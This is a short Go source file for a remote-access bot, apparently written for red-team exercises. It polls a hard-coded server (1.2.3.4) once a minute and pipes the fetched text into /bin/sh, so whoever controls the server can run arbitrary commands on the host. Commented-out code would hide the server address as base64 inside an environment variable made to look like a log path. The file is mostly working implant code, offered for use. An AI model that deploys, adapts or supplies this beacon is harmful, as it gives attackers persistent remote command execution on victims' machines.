// Golang bot to pull commands from webserver and execute them
// Disclaimer: This barely works
// @author: degenerat3

package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

var src = "Snare" // where is this calling back from
var loopTime = 60 //sleep time in secs

func getServer() string {
	//envVar := os.Getenv("DEBUGGER_LOGGING") //fetch environment variable
	//trimmedStr := strings.Replace(envVar, "/var/log/system-", "", 1)
	//decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
	//return string(decoded)
	servs := make([]string, 0)
	servs = append(servs,
		"1.2.3.4",
	)
	selection := servs[rand.Intn(len(servs))]
	return string(selection)
}

func getIP() string {
	t, _ := net.InterfaceAddrs()
	for _, ip := range t {
		if strings.Contains(ip.String(), ".2.1") {
			fmt.Println(ip.String())
			i := ip.String()
			real_i := strings.Split(i, "/")[0]
			return real_i
		}
	}
	return "unknown-pfsense"
}

func getCommands() {
	ip := getIP()
	serv := getServer()
	url := "http://" + serv + "/" + ip + "/" + src
	r, err := http.Get(url)
	if err != nil {
		return
	}
	defer r.Body.Close()
	txt, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return
	}
	//exec.Command(string(txt))
	bsh := exec.Command("/bin/sh")
	stdin, _ := bsh.StdinPipe()
	go func() {
		defer stdin.Close()
		io.WriteString(stdin, string(txt))
	}()
	bsh.Run()
}

func main() {
	for {

		getCommands()
		time.Sleep(time.Duration(loopTime) * time.Second)
	}

}
